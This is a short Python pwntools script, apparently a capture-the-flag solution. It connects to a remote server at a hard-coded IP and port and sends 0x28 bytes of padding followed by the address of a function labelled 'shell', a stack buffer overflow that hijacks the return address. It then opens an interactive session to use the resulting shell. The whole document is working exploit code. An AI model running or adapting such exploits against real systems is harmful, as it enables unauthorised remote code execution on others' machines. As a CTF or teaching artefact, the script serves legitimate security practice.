from pwn import *

shell = 0x400646

r = remote('140.110.112.77', 2121)
r.recvuntil('input:')
r.sendline('a' * 0x28 + p64(0x400646))
r.interactive()
